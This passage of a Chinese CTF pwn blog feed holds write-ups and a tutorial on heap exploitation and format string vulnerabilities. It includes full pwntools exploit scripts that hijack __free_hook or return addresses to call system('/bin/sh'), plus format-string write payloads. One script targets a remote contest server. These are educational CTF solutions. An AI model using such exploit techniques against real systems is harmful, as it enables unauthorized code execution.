class="number">0x78</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    qword_202060[i] = <span class="built_in">malloc</span>(result);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"content:"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, qword_202060[i], <span class="built_in">size</span>);</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"done"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一题不能开辟堆块大小满足unsorted bin 的堆块。</p><p>这一题主要思路就是通过getchar()触发malloc_consolidate ,然后出现main_arena地址在堆块中，然后通过getchar()部分修改去打stdout。然后同样使用getchar()来制造tcache poisoning来攻击__free_hook 修改为system地址，最后getshell。</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">exec_file=<span class="string">"./new_heap"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">elf=ELF(exec_file,checksec = <span class="literal">False</span>)</span><br><span class="line">argv = [<span class="string">"/glibc/x64/2.29/lib/ld-2.29.so"</span>,<span class="string">"--library-path"</span>,</span><br><span class="line">        <span class="string">"/glibc/x64/2.29/lib/"</span>,<span class="string">"./new_heap"</span>]</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    p=process(argv=argv)</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote()</span><br><span class="line">    libc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    n = globals()</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> n.items():</span><br><span class="line">        <span class="keyword">if</span> value == address:</span><br><span class="line">            <span class="keyword">return</span> success(key+<span class="string">"  ==&gt;  "</span>+hfuck(address))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">"3.exit\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content=<span class="string">"A"</span>)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size:"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"content:"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'exit'</span>,str(<span class="number">3</span>))</span><br><span class="line">    p.sendafter(<span class="string">'sure?'</span>,content)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            add(<span class="number">0x38</span>,<span class="string">'A\n'</span>)</span><br><span class="line">        add(<span class="number">0x38</span>)</span><br><span class="line">        add(<span class="number">0x38</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">            delete(i)</span><br><span class="line"></span><br><span class="line">        fuck(<span class="string">'A'</span>*<span class="number">0x38</span>+p64(<span class="number">0x41</span>))</span><br><span class="line">        add(<span class="number">0x18</span>,<span class="string">'A\n'</span>)</span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        add(<span class="number">0x38</span>)</span><br><span class="line">        delete(<span class="number">8</span>)</span><br><span class="line">        add(<span class="number">0x18</span>)</span><br><span class="line">        add(<span class="number">0x18</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x3f</span>):</span><br><span class="line">            fuck(<span class="string">""</span>)</span><br><span class="line">        fuck(<span class="string">'A'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+<span class="string">'A'</span>*<span class="number">0x20</span>+<span class="string">"\x60\x27"</span>)</span><br><span class="line">        add(<span class="number">0x38</span>)</span><br><span class="line">        add(<span class="number">0x38</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">        p.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line">        p.recvuntil(<span class="string">"\x7f"</span>)</span><br><span class="line">        libc_base = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)<span class="number">-131</span>-libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">        fuck(libc_base)</span><br><span class="line">        delete(<span class="number">12</span>,<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x41</span>):</span><br><span class="line">            fuck(<span class="string">""</span>)</span><br><span class="line">        fuck(<span class="string">"A"</span>*<span class="number">0x20</span>+p64(libc_base+libc.symbols[<span class="string">"__free_hook"</span>]))</span><br><span class="line">        add(<span class="number">0x18</span>,<span class="string">'/bin/sh\x00'</span>,<span class="literal">False</span>)</span><br><span class="line">        add(<span class="number">0x18</span>,p64(libc_base+libc.symbols[<span class="string">"system"</span>]),<span class="literal">False</span>)</span><br><span class="line">        delete(<span class="number">15</span>,<span class="literal">False</span>)</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        p=process(argv=argv)</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;D3CTF那天去打红帽杯了，但是D3CTF 结束后，和其他师傅交流了一下，这道题不错 。而且这道题考点很清奇。&lt;/p&gt;
&lt;p&gt;首先我们来看一下这一题开启的保护和使用的libc版本&lt;/p&gt;
&lt;p&gt;题目附件:&lt;a href=&quot;./new_heap_update.zip&quot;&gt;new
      
    
    </summary>
    
    
      <category term="pwn学习" scheme="http://Whali3n51.top/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="UAF" scheme="http://Whali3n51.top/tags/UAF/"/>
    
      <category term="buffer in heap" scheme="http://Whali3n51.top/tags/buffer-in-heap/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串专题总结</title>
    <link href="http://whali3n51.top/2019/12/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>http://whali3n51.top/2019/12/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E6%80%BB%E7%BB%93/</id>
    <published>2019-12-10T07:27:11.000Z</published>
    <updated>2020-02-08T14:17:56.219Z</updated>
    
    <content type="html"><![CDATA[<p>最近比赛有太多的格式化字符串漏洞，今天就来总结一下常见的格式化字符串。由易到难的讲解格式化字符串的利用和最近遇到格式化字符串的考点。</p><h2><span id="漏洞原理分析">漏洞原理分析</span></h2><p>格式化字符串一般都是程序员为了偷懒而导致的漏洞。为了输出字符串，而直接使用printf(&amp;buf)来打印字符串。今天我们从原理上来讲解这样写为什么会产生漏洞。</p><p>正常的使用printf(“%s”,&amp;buf);来打印字符串</p><p>当call printf的时候栈上的结构为：</p><p><img src="./1.png" alt></p><p>这样函数就打印出第二个参数的地址上的字符串,这样就能正常打印出‘aaaa’。printf函数识别出‘%s’是一个格式化字符串，然后根据这个格式化字符串去取参数，’%s‘默认取第二个参数为作为字符串输出地址也就是‘%s’的下面一个栈空间，这样就能打印出‘aaaa’。</p><p>如果我们程序员偷懒，不使用格式化字符串，那么我们还是能打印出来。</p><p><img src="./2.png" alt></p><p>因为printf没有解析到格式化字符串，直接将‘aaaa’作为格式化字符串输出了。这原理就像是我们平时用printf(“hello world !!”);这个道理是一样的。但是这个时候和printf(“hello world !!”);不一样的是，字符串是我们能控制的，这个时候漏洞就出现了。</p><h2><span id="32位格式化字符串利用">32位格式化字符串利用</span></h2><p>如果我任意构造一个格式化字符串，printf就会去解析，然后就根据解析的内容，去栈上都读偏移，然后执行相应的功能。</p><p>例如，我们输入一个‘%s’的格式化字符串，我们来分析他的原理。</p><p><img src="./3.png" alt></p><p>同理，printf解析出‘%s’了，相应的他要读出printf的第二个参数上的值。可是我们又没有给第二个参数，但是在程序里面，确认参数是不看你有没有输入，而是看栈的偏移。对于printf来说，第一个参数是栈顶，第二个参数是当前的[esp+4],第三个参数是[esp+8],依次类推。这里也就是输出‘&amp;buf’栈空间下面那个地址上的值。但是这个地方不确定是不是地址，所以程序可能打印失败。</p><p>但是格式化字符串给了一个我们可以自动定位的一个格式化字符串‘%n$’的参数。也就是在这里可以自己定位栈空间。</p><p>如果我们在这个给的是这‘%4$s’+p32(&amp;’hello world’)</p><p><img src="./4.png" alt></p><p>所以这个时候打印出来的就是’hello world’了。这个printf解析出有格式化串‘%4$s‘，也就是将buf栈下第4个栈空间的地址上的值当作字符串打印出来。注意这个p32(&amp;”hello world”)在这里只是做举例用，这个值我们可以写做任意一个值，也就是说我们能泄露任意地址上的值。这就达到了任意地址泄露。</p><p>当然达到任意地址泄露往往只是成功了一半，我们还需要达到任意地址写。</p><p>这个时候printf又提供了一个参数’%n‘,这个参数是将前面打印出来的字符数量写入到第二个参数的所指向的地址上的值。这个时候配合’%c‘可以写任意的值。当然这个’%n‘也可以结合’n$‘来使用，可以定位在栈上偏移。</p><p>例如，我们想在0x80000000(只是举例，不保证地址的合法性)上面写一个0x66666666</p><p>我们应该这样构造出这样的栈</p><p><img src="./5.png" alt></p><p>payload应该是这样%1717986918c%7$n+p32(0x80000000),这样就可以在0x80000000上面写0x66666666。</p><p>但是一般这样写有个问题，靠%1717986918c打印出0x66666666需要很长时间，一般程序会死掉，所以不能直接这么写。但是printf还提供了一个%n同类的格式化字符串</p><p>%n        一次性写入四个字节</p><p>%hn    一次性写入两个字节</p><p>%hhn        一次性写入一个字节</p><p>然后我们可以这样构造</p><p>%26214c%8$hn%9$hnaaa+p32(0x80000000)+p32(0x80000002)</p><p>注意，构造的时候，在格式化的串直接不有’\x00‘字符串截断，不然printf不能解析格式化字符串了。</p><p><img src="./6.png" alt></p><p>这样就可以任意地址写了。</p><p>一般来说，格式化字符串就是通过任意地址读写，来泄露got和修改got表来达到劫持程序流程。</p><p>pwntools整合了32位格式化字符串的利用。</p><p>fmtstr_payload(offset,{target_addr:value},write_size=’short’)自动就生成了payload,但是我不建议新手直接使用这个函数。</p><p>原理讲解到这里了，来个例子：</p><p>题目链接：<a href></a></p><h2><span id="64位格式化字符串利用">64位格式化字符串利用</span></h2><p>64位的和32位的利用方式其实是差不多的，唯一的差别就是64位的传参方式不一样，所以偏移量不一样。64位传参方式是rdi,rsi,rdx,rcx,r8,r9。第一个参数已经被我们格式化字符串占用了，所以第%1$p是rsi的值，然后往后顺延，直到%6$p是栈上第一个数据，然后后面和32位差不多了。</p><p>但是64位和32位还有一点不同的是，32位的地址一般能沾满整个栈单元，没有’\x00’字符，所以就不会无论地址写在格式化字符串前或者后面，都不会会造成格式化字符串的截断，但是64位不同，64位的地址一般不会沾满整个栈单元，一般只使用六个字节。所以会有’\x00’截断，如果把地址写在格式化字符串的前面，那么就会产生’\x00’截断，导致后面格式化字符串被截断不执行。</p><p>好了  这里也举个例子说一下吧。</p><p>题目链接</p><h2><span id="ebp-chain修改任意地址">Ebp chain修改任意地址</span></h2><p>Ebp chain是格式化字符串比较高级的利用方式，前两种利用方式是我们输入的值直接在栈上，但是如果我们输入的值全在bss段上，那么我们怎么做到修改格式化字符串呢？</p><p>通过上面的知识我们得知，想要修改或者读一个地址的值，那么这个地址就得在栈上。所以我们要想办法把这个地址写到栈上。这个说起来有点抽象，还是举个例子吧。</p><p>这是swupctf的一道题。</p><p>题目链接：<a href="login">login</a></p><p>首先我们进IDA看一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804854B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your password: "</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s1[<span class="built_in">read</span>(<span class="number">0</span>, s1, <span class="number">0x32</span>u)] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">"wllmmllw"</span>, <span class="number">8u</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This is the wrong password: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(s1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Login successfully! Have fun!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现这是个无次数限制的格式化字符串利用。但是这里往bss段上写，不能像上面那样利用。这个时候我们看一下我们利用的时候，栈上的数据</p><p><img src="./7.png" alt></p><p>我们能看到栈上ebp的指针指向上一个ebp。上一个ebp指向上上个ebp。我们前面是不是说过只要有地址，我们就能往这个地址上写任意的值。</p><p>这个时候我们可以这样利用。这里我们为了叙述，我们把当前ebp叫ebp1,我们上一个ebp叫ebp2,我们把上上个ebp叫做ebp3。</p><p>这个时候我们需要转换思维，既然这个有值是栈地址，我们就不需要去修改got表再劫持程序了，我们直接修改老eip。</p><p>我们可以这样利用，我们通过ebp1将ebp2的值，让他指向一个老eip。所以然后就可以利用了。然后通过ebp2去修改老eip的值。最后改为system地址</p><p>我的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./login"</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">elf=ELF(<span class="string">"./login"</span>)</span><br><span class="line">bss=<span class="number">0x804B0A0</span>+<span class="number">0xc</span>+<span class="number">0x10</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please input your name: "</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%6$p'</span></span><br><span class="line">gdb.attach(p,<span class="string">''' b *0x080485AF '''</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Please input your password: "</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">stack_addr=int(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> hex(stack_addr)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%15$p'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">libc_start_main=int(p.recv(<span class="number">8</span>),<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">libc=LibcSearcher(<span class="string">"__libc_start_main"</span>,libc_start_main)</span><br><span class="line">system=libc_start_main-libc.dump(<span class="string">"__libc_start_main"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">str_bin_sh=libc_start_main-libc.dump(<span class="string">"__libc_start_main"</span>)+libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0xc</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((system&amp;<span class="number">0xffff</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0xc</span>+<span class="number">2</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((system&gt;&gt;<span class="number">16</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0x4</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((str_bin_sh&amp;<span class="number">0xffff</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0x4</span>+<span class="number">2</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((str_bin_sh&gt;&gt;<span class="number">16</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">gdb.attach(p,<span class="string">''' b *0x080485AF '''</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-8</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">p.sendafter(<span class="string">"Try again!\n"</span>,<span class="string">"wllmmllw"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="总结">总结</span></h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近比赛有太多的格式化字符串漏洞，今天就来总结一下常见的格式化字符串。由易到难的讲解格式化字符串的利用和最近遇到格式化字符串的考点。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&quot;漏洞原理分析&quot;&gt;漏洞原理分析&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;格式化字符串一般都是程序员为了偷懒而导致的漏洞
      
    
    </summary>
    
    
      <category term="pwn总结" scheme="http://Whali3n51.top/categories/pwn%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="格式化字符串" scheme="http://Whali3n51.top/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>安询杯pwn_wp</title>
    <link href="http://whali3n51.top/2019/12/01/%E5%AE%89%E8%AF%A2%E6%9D%AFwp_pwn/"/>
    <id>http://whali3n51.top/2019/12/01/%E5%AE%89%E8%AF%A2%E6%9D%AFwp_pwn/</id>
    <published>2019-12-01T05:40:00.000Z</published>
    <updated>2020-03-29T13:51:46.788Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="summary">summary</span></h2><p>简单说一下这个比赛，感觉这个比赛难度还是不错的，刚刚好，侥幸拿到了一个一血。其中有三道盲打pwn，两道格式化字符串的，一道rop的盲打。rop那道是真的没什么思路，还有一道路由器的pwn,我不知道为什么运行不了二进制文件，可能我环境配置的问题吧。</p><h2><span id="0x01-fmt32">0x01 fmt32</span></h2><h3><span id="introduction">introduction</span></h3><p>这一道题通过题目描述，只给了容器，然后看题目名为32位格式化字符串，并没有像往常的pwn题那样给二进制文件。所以这个时候大致猜测为盲打pwn。</p><h3><span id="exploit">exploit</span></h3><p>这道题侥幸拿到了一个一血，顺便总结一下我自己认为的格式化字符串盲打的想法吧。首先就是利用’%p’通过格式化字符串将栈上数据全部打印出来。打印出来，会得到两个信息，一个是我们输入的值是在栈上，另一个是发现有一个text段的地址，这个时候就能得到程序的基址，而且程序没有开启pie。按照一般的思路，这个时候可以用%s将整个程序dump出来。但是我没有这么做，我嫌效率太低。我直接猜测的got表的地址。我为什么这么做呢。因位got表的偏移和text的偏移是固定的，想知道这个偏移，随便打开一个32位程序就知道了，接下来就是不断尝试printf在got表的地址了。然后后面就是格式化字符串的利用了。</p><p>下面是我的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'47.108.135.45'</span>,<span class="number">10001</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">addr=<span class="number">0x804A014</span></span><br><span class="line">payload=<span class="string">'a'</span>+p32(addr)+<span class="string">'%'</span>+<span class="string">'8'</span>+<span class="string">'$s'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me:"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'Repeater:a'</span>)</span><br><span class="line">p.recv(<span class="number">4</span>)</span><br><span class="line">printf_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">"printf"</span>,printf_addr)</span><br><span class="line">system=printf_addr-libc.dump(<span class="string">"printf"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>+p32(addr)+p32(addr+<span class="number">2</span>)+<span class="string">'%'</span>+str((system&amp;<span class="number">0xffff</span>)<span class="number">-0x12</span>)+<span class="string">'c%8$hn'</span>+<span class="string">'%'</span>+str((system&gt;&gt;<span class="number">16</span>)-((system&amp;<span class="number">0xffff</span>)<span class="number">-0x12</span>)<span class="number">-18</span>)+<span class="string">'c%9$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me:"</span>,payload)</span><br><span class="line"><span class="keyword">print</span> hex(system)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">";cat /flag"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x02-fmt64">0x02 fmt64</span></h2><h3><span id="introduction">introduction</span></h3><p>这一道题和上一道题一样，不过这一道题给了一个txt,里面描述如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf -s stilltest</span></span><br><span class="line">Symbol table '.dynsym' contains 15 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)</span><br><span class="line">     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.2.5 (2)</span><br><span class="line">     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.2.5 (2)</span><br><span class="line">     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5 (2)</span><br><span class="line">     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memset@GLIBC_2.2.5 (2)</span><br><span class="line">     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND alarm@GLIBC_2.2.5 (2)</span><br><span class="line">     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.2.5 (2)</span><br><span class="line">     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)</span><br><span class="line">     9: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND gmon_start</span><br><span class="line">    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sprintf@GLIBC_2.2.5 (2)</span><br><span class="line">    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.2.5 (2)</span><br><span class="line">    12: 0000000000601080     8 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.2.5 (2)</span><br><span class="line">    13: 0000000000601090     8 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.2.5 (2)</span><br><span class="line">    14: 00000000006010a0     8 OBJECT  GLOBAL DEFAULT   26 stderr@GLIBC_2.2.5 (2)</span><br></pre></td></tr></table></figure><h3><span id="exploit">exploit</span></h3><p>根据这个txt,完全可以算出printf_got表地址。存放stdout的地址为601080，这个地址同时也是bss段的开头地址，bss地址和got表地址相差0x20，这个也是随便打开一个64位程序能得到的偏移。然后也是泄露地址，确定偏移量，然后格式化字符串构造。不过可惜没拿到一血，当时因为有其他事情，晚做了三四个小时。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 